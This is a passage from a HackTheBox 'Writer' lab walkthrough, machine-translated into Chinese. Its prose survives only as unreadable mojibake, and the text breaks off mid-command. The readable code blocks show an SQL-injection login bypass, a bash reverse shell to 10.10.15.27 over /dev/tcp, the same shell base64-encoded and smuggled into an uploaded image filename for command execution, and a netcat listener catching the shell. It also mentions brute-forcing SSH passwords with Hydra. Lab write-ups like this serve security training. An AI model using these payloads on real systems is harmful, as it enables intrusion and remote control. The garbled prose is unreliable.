<html>
<head>
<title>Writer from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ¥è‡ªHackTheBoxçš„ç¼–å†™å™¨â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/writer-from-hackthebox-detailed-walkthrough-3d82582a7f2d?source=collection_archive---------2-----------------------#2021-10-17">https://infosecwriteups.com/writer-from-hackthebox-detailed-walkthrough-3d82582a7f2d?source=collection_archive---------2-----------------------#2021-10-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b2a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="e1d8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/bd50d4ed463df9aa28603cb0bf24d2af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*RbPw2KT-ZBltv3ah.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é»‘å®¢ç›’å­ä½œè€…</figcaption></figure><p id="fe12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Writeræ˜¯HackTheBoxä¸Šçš„ä¸€å°ä¸­å‹æœºå™¨ã€‚æˆ‘ä»¬é¦–å…ˆåˆ—ä¸¾ä¸€ä¸ªå¼•å¯¼æˆ‘ä»¬è¿›å…¥ç™»å½•é¡µé¢çš„ç½‘ç«™ï¼Œå¾ˆå®¹æ˜“ç»•è¿‡è¿™ä¸ªé¡µé¢è¿›å…¥ä»ªè¡¨æ¿ã€‚è°ƒæŸ¥æ˜¾ç¤ºä¸Šä¼ å›¾åƒçš„æ–‡ä»¶åæ²¡æœ‰è¢«æ­£ç¡®æ¸…ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å®ƒæ¥è·å¾—ä¸€ä¸ªåå‘å¤–å£³ã€‚æˆ‘ä»¬æ‰¾åˆ°äº†MySQLæ•°æ®åº“çš„å‡­è¯ï¼Œè¿™åè¿‡æ¥åˆç»™äº†æˆ‘ä»¬ä¸€ä¸ªç”¨æˆ·æ•£åˆ—ã€‚æˆ‘ä»¬ç ´è§£å®ƒï¼Œé€šè¿‡SSHè¿æ¥ï¼Œå‘ç°æˆ‘ä»¬çš„å‡çº§è·¯å¾„æ˜¯é€šè¿‡Postfixã€‚è¿™å¯¼è‡´æˆ‘ä»¬ä»¥ç¬¬äºŒä¸ªç”¨æˆ·çš„èº«ä»½è¿æ¥ï¼Œæˆ‘ä»¬å‘ç°é”™è¯¯é…ç½®çš„æƒé™å…è®¸æˆ‘ä»¬åˆ©ç”¨conf.dæ–‡ä»¶å¤¹ä»¥rootç”¨æˆ·çš„èº«ä»½è¿æ¥shellã€‚</p><p id="fd42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯¹äºä¸€ä¸ªä¸­ç­‰çš„ç›’å­æ¥è¯´ï¼Œè¿™æ˜¯ç›¸å½“å¤æ‚çš„ã€‚æ‰€ä»¥æˆ‘å¸Œæœ›ä½ å’Œæˆ‘ä¸€æ ·å–œæ¬¢å®ƒã€‚</p><p id="e630" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">éœ€è¦çš„æŠ€èƒ½æ˜¯ç½‘ç»œå’Œæ“ä½œç³»ç»Ÿæšä¸¾å’Œä½¿ç”¨æ‰“å—æ¥è°ƒæŸ¥ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯å¯¹postfixçš„è¯¦ç»†äº†è§£ä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒã€‚ä»¥åŠå¦‚ä½•ä½¿ç”¨æ–‡ä»¶æ¸…ç†ä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒã€‚</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.com/home/machines/profile/361" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">ä¾µå…¥æµ‹è¯•å®éªŒå®¤</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="0004" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="7ce8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/e8bb7de4a90330ea9ae3e813204b58e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fd4N55sE0VEkunuJ5IP-EA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç›’å­çš„Nmapæ‰«æ</figcaption></figure><p id="f304" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æœ‰SSHã€SMBå’Œç«¯å£80ä¸Šçš„ç½‘ç«™ã€‚ç”±äºæˆ‘ä»¬åœ¨Linux CTFä¸Šä¸ç»å¸¸çœ‹åˆ°SMBï¼Œæ‰€ä»¥æˆ‘ä»é‚£é‡Œå¼€å§‹ï¼Œä½†é¦–å…ˆå°†IPæ·»åŠ åˆ°æˆ‘ä»¬ä¸»æœºçš„æ–‡ä»¶ä¸­:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="568c" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# echo "10.10.11.101 writer.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="53fb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SMBMap</h1><p id="dd81" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨è®©æˆ‘ä»¬ä½¿ç”¨smbmap:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fee5" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# smbmap -H writer.htb<br/>[+] IP: writer.htb:445  Name: unknown<br/>    Disk                 Permissions     Comment<br/>    ----                 -----------     -------<br/>    print$               NO ACCESS       Printer Drivers<br/>    writer2_project      NO ACCESS<br/>    IPC$                 NO ACCESS       IPC Service (writer server</span></pre><h1 id="6051" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Enum4Linux</h1><p id="8dfe" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ²¡æœ‰å¼€æ”¾å…±äº«ï¼Œç”¨enum4linuxçœ‹çœ‹å§:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9b74" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# enum4linux -a writer.htb                    <br/>Starting enum4linux v0.8.9 on Mon Oct 11 22:04:49 2021<br/><br/> ========================== <br/>|    Target Information    |<br/> ========================== <br/>Target ........... writer.htb<br/>RID Range ........ 500-550,1000-1050<br/>Username ......... ''<br/>Password ......... ''<br/>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br/> ================================================================ <br/>|  Users on writer.htb via RID cycling (RIDS: 500-550,1000-1050) |<br/> ================================================================ <br/>[I] Found new SID: S-1-22-1<br/>[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159<br/>[I] Found new SID: S-1-5-32<br/>S-1-22-1-1000 Unix User\kyle (Local User)<br/>S-1-22-1-1001 Unix User\john (Local User)<br/>S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)<br/><br/>enum4linux complete on Mon Oct 11 22:06:30 2021</span></pre><p id="150c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ç æ‰äº†å¤§éƒ¨åˆ†è¾“å‡ºï¼Œä½†æ˜¯åœ¨ä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ä¸¤ä¸ªç”¨æˆ·å·²ç»æ‰¾åˆ°äº†kyleå’Œjohnã€‚æˆ‘è®©ä¹å¤´è›‡å°è¯•ç”¨rockyou wordlistç ´è§£è¿™ä¸¤ä¸ªè´¦æˆ·çš„å¯†ç ã€‚å¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äºSSHå¼ºåŠ›çš„é€‰é¡¹ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯éå¸¸æœ‰ç”¨çš„</p><p id="cfc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ æƒ³è®©ç”¨æˆ·éµå¾ªé¢„å®šçš„è·¯å¾„ï¼Œé‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹ã€‚å¦‚æœä½ æƒ³èµ°æ›´å¿«æ›´ç®€å•çš„è·¯ï¼Œå‘ä¸‹æ»šåŠ¨åˆ°æ›´ä¸‹é¢çš„éƒ¨åˆ†ã€‚</p><h1 id="da16" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">é¢„æœŸè·¯å¾„</h1><p id="1c17" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åœ¨è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘æµè§ˆäº†ä¸€ä¸‹80ç«¯å£çš„ç½‘ç«™:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ni"><img src="../Images/f5e8cfe76ce2ad13de0772cbc6894919.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_64Ia0QhVdXCH3fL.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">80ç«¯å£ä¸Šçš„writer.htb webtsite</figcaption></figure><h1 id="7781" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Feroxbuster</h1><p id="b3b8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è¿™æ˜¯ä¸€ä¸ªé™æ€çš„åšå®¢ï¼Œé‡Œé¢æœ‰å¾ˆå¤šä¹çœ‹ä¸Šå»æ¯«æ— æ–°æ„çš„æ–‡ç« ã€‚æˆ‘æ³¨æ„åˆ°åœ¨â€œå…³äºâ€é¡µé¢ä¸Šæœ‰ä¸€ä¸ªç”¨æˆ·admin@writer.htbã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹Feroxbuster:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nj"><img src="../Images/863c202b5f4e5112b8be94ab2481aebf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AH5yDtb9oarMMvoD5Sx3cg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Ferroxbusteräº§é‡</figcaption></figure><p id="0a27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä»åˆ—è¡¨ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°æ–‡ä»¶å¤¹/ç®¡ç†æœ‰200ä¸ªå“åº”ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/e9ecc6e4622e08318d8513e20121ddd0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/0*tJmF1RPPvNJcXo8C.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç®¡ç†å‘˜ç™»å½•é¡µé¢</figcaption></figure><h1 id="337a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SQLiæ—è·¯</h1><p id="8703" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ä¸€ä¸ªç®¡ç†å‘˜ç™»å½•é¡µé¢ã€‚æˆ‘å°è¯•äº†ä¸€äº›ä¸èµ·ä½œç”¨çš„æ ‡å‡†å‡­è¯ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨äº†<a class="ae nh" href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a> SQLiå¤‡å¿˜å•ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥ç»•è¿‡ç™»å½•:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/e9d5fd12e8f06acb235628be879ee689.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/0*uxhd-UCHXzqRedm5.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">SQLæ—è·¯</figcaption></figure><p id="025f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ‹›å¥æ•ˆäº†ï¼Œæˆ‘æ¥åˆ°äº†ä»ªè¡¨ç›˜å‰:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/bd30ab3c38171b2ce60cff0324881768.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9qp3Y2_dSQrBZGP9.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç®¡ç†ä»ªè¡¨æ¿</figcaption></figure><p id="ae9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç‚¹å‡»å·¦è¾¹çš„ä¸‰ä¸ªç ´æŠ˜å·å¹¶é€‰æ‹©Storiesï¼Œæˆ‘ä»¬å°†åˆ°è¾¾è¿™é‡Œ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/92f084257ef745fffdc58aa3bc8597e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fX8k4OK-jGoAICgc.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ•…äº‹é¡µé¢</figcaption></figure><p id="622d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç‚¹å‡»ç¬¬ä¸€ç¯‡æ–‡ç« å³ä¾§çš„ç¼–è¾‘æŒ‰é’®ï¼Œæˆ‘ä»¬å°†è¿›å…¥ä»¥ä¸‹é¡µé¢:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nn"><img src="../Images/3ab56ff09a7f666abc6efc9ea133eeae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*negQiev1J2lTGsrf.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç¼–è¾‘æ•…äº‹</figcaption></figure><p id="6bb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æµè§ˆæŒ‰é’®è®©æˆ‘ä»¬ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œå°è¯•å…¶ä»–ä¸œè¥¿ã€‚jpgç»™å‡ºä¸€ä¸ªé”™è¯¯:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi no"><img src="../Images/8aa274c3033dfd78031958c0ef5ec1f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*NADTrRBtMYmM5ZcL.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ— æ•ˆçš„æ–‡ä»¶æ‰©å±•å</figcaption></figure><h1 id="51ae" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å›¾åƒæ–‡ä»¶å¤„ç†</h1><p id="6586" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç„¶è€Œï¼Œåƒ. jpg.phpè¿™æ ·çš„åŒæ–‡ä»¶æ‰©å±•åä¹Ÿå¯ä»¥ã€‚æ‰€ä»¥è¡¨æ˜å®ƒæ²¡æœ‰æ­£ç¡®åœ°å‡€åŒ–è¾“å…¥ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªæ‰©å±•åä¸ºjpgçš„ç©ºæ–‡ä»¶è¿›è¡Œæµ‹è¯•ï¼Œç„¶ååœ¨ä»¥ä¸‹å†…å®¹åæ·»åŠ æ³¨é‡Š:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9903" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# touch 'test.jpg; `pencer`'</span></pre><p id="a3df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸Šä¼ æ–‡ä»¶ç„¶åæ‹¦æˆªæ‰“å—ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi np"><img src="../Images/1ff735b55821c0b795bdbb47aa7dfbb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/0*StgQzLLxo69GJmoW.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ‰“å—æ‹¦æˆª</figcaption></figure><p id="c4a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°å®ƒåœ¨è¿™ä¸€ç‚¹ä¸Šæ²¡æœ‰è¢«å‰¥ç¦»ï¼Œå¦‚æœæˆ‘ä»¬è½¬å‘è¯·æ±‚ï¼Œå®ƒä¼¼ä¹å·²ç»ä¿å­˜äº†æ–‡ä»¶ã€‚</p><p id="42df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å›é¡¾ä¹‹å‰çš„Feroxbusteræ‰«æï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒæ‰¾åˆ°äº†ä¸€ä¸ªå­˜æ”¾å›¾åƒçš„æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨curlæŸ¥çœ‹é‡Œé¢:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/1992099d09872cc612effd1d28f474e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VB2-vlfcWfNrp7B6lX1_gg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ˜¾ç¤ºæ–‡ä»¶å·²ä¸Šä¼ çš„Curlè¾“å‡º</figcaption></figure><p id="dfb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åœ¨åº•éƒ¨çœ‹åˆ°äº†æˆ‘æœ€åˆçš„test.jpgï¼Œç¬¬äºŒä¸ªæ–‡ä»¶åœ¨æ–‡ä»¶ååæ·»åŠ äº†å•è¯ï¼Œè¿™æ ·æˆ‘ä»¬å°±çŸ¥é“æˆåŠŸä¸Šä¼ åæ–‡ä»¶çš„æœ€ç»ˆä½ç½®ã€‚</p><p id="4283" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¬¬äºŒéƒ¨åˆ†èŠ±äº†æˆ‘ä¸€æ®µæ—¶é—´æ‰å¼„æ˜ç™½ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åšçš„æ˜¯ä½¿ç”¨image_urlå‚æ•°æ¥æ‰§è¡Œä»£ç ã€‚é¦–å…ˆåˆ›å»ºä¸€ä¸ªåŒ…å«æˆ‘ä»¬å‘½ä»¤çš„å­—ç¬¦ä¸²æ¥è¿æ¥ä¸€ä¸ªåå‘shellï¼Œæˆ‘åªæ˜¯ä½¿ç”¨äº†ä¸€ä¸ªç»å…¸çš„PenTestMonkey:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0a88" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# echo -n "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.27/1337 0&gt;&amp;1'" | base64<br/>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn</span></pre><p id="7922" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ç”¨äº†base64ç¼–ç æ¥é¿å…ä¸Šä¼ æ—¶å‡ºç°ä»»ä½•é—®é¢˜ã€‚</p><p id="3d30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒæ–‡ä»¶ï¼Œåƒæˆ‘ä»¬ä¹‹å‰æµ‹è¯•çš„é‚£æ ·é™„åŠ ä¸Šæˆ‘ä»¬çš„shellä»£ç :</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e8ec" class="nc km iq my b gy nd ne l nf ng">touch 'pencer.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn | base64 -d | bash `;'</span></pre><p id="524c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨ä¸Šé¢ï¼Œæˆ‘å·²ç»ä½¿ç”¨echoå°†ç¼–ç çš„shellä¼ é€’ç»™base64 -dï¼Œå°†å…¶è§£ç å›åŸå§‹ç‰ˆæœ¬ï¼Œç„¶åä¼ é€’ç»™bashæ¥æ‰§è¡Œå®ƒã€‚</p><p id="dd55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬éœ€è¦åƒä»¥å‰ä¸€æ ·é€šè¿‡æµè§ˆä¸€ä¸ªç°æœ‰çš„æ•…äº‹å¹¶é€‰æ‹©å®ƒï¼Œç„¶åä¿å­˜å®ƒæ¥ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥å†æ¬¡æ£€æŸ¥å®ƒæ˜¯ç”¨curlä¸Šä¼ çš„:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a4ab" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# curl http://writer.htb/static/img/<br/>&lt;SNIP&gt;<br/>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/unknown.gif" alt="[   ]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="pencer.jpg;%20%60echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn%20%7c%20base64%20-d%20%7c%20bash%20%60;"&gt;pencer.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn | base64 -d | bash `;&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2021-10-13 21:48  &lt;/td&gt;&lt;td align="right"&gt;  0 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</span></pre><p id="5e9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ€åï¼Œæˆ‘ä»¬å†æ¬¡ä¸Šä¼ é™„åŠ äº†shellçš„å›¾åƒï¼Œä½†è¿™æ¬¡åœ¨Burpä¸­æ•è·å®ƒï¼Œå¹¶å°†è·¯å¾„æ·»åŠ åˆ°æ–‡ä»¶ä¸­:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/980e3e9e4d262123fa9fa3df1636cd68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7m-dRRlJZ_O603Bz.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ‰“å—æ—¶æ“ä½œ</figcaption></figure><p id="bfc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¹‹å‰åˆ¶å®šçš„æ–‡ä»¶è·¯å¾„ï¼Œå¹¶ä½¿ç”¨å®ƒå°†å·²ç»ä¸Šä¼ çš„å›¾åƒæ·»åŠ åˆ°image_urléƒ¨åˆ†ã€‚å½“æ‚¨åœ¨Burpä¸­å•å‡»Forwardæ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šæ‰§è¡Œæ·»åŠ çš„é¢å¤–å†…å®¹ï¼Œå› æ­¤è¯·ç¡®ä¿æ‚¨æœ‰ä¸€ä¸ªNetcatä¾¦å¬å™¨åœ¨æ‚¨ä¹‹å‰åˆ›å»ºå­—ç¬¦ä¸²æ—¶ä½¿ç”¨çš„ç«¯å£ä¸Šç­‰å¾…ã€‚</p><h1 id="3102" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">WWW-æ•°æ®å¤–å£³</h1><p id="5ea0" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ä¸Šä¼ ååˆ‡æ¢åˆ°netcatæŸ¥çœ‹æˆ‘ä»¬æœ‰ä¸€ä¸ªshellè¿æ¥:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a0da" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/writer]<br/>â””â”€# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.15.27] from (UNKNOWN) [10.10.11.101] 53962<br/>bash: cannot set terminal process group (1073): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@writer:/$</span></pre><p id="9f00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æˆ‘ä»¬ç»§ç»­ä¹‹å‰å‡çº§ç»ˆç«¯:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="743e" class="nc km iq my b gy nd ne l nf ng">www-data@writer:/$ which python<br/>which python<br/>www-data@writer:/$ which python3<br/>which 